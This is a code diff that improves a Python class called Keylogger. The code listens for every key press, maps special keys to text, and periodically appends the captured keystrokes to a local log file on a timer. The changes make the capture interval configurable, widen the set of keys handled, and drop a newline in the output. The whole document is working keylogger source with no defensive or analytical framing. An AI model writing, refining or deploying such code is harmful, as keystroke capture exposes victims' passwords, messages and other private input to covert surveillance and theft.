@@ -14,11 +14,11 @@ class Keylogger:
     def start(self):
         listener = keyboard.Listener(on_press=self.on_press)
         listener.start()
-        sleep(10)
+        sleep(self.interval)
         self.writeLog()
 
     def on_press(self, key):
-        specialKeys = {"Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "", "Key.tabNone" : "", "Key.enter": "enter" }
+        specialKeys = {"None":"", "Key.num_lock":"num_lock", "Key.pause":"", "Key.scroll_lock":"scroll_lock", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "caps_lock", "Key.tabNone" : "", "Key.enter": "enter" }
         try:
             self.log += str(key.char)
         except AttributeError:
@@ -38,7 +38,7 @@ class Keylogger:
         logC += self.log
         f = open("log.txt","a")
         f.write(logC)
-        f.write("\n")
+        # f.write("\n")
         self.log = ""
         timer = Timer(interval=self.interval, function=self.writeLog)
         # timer.daemon = True
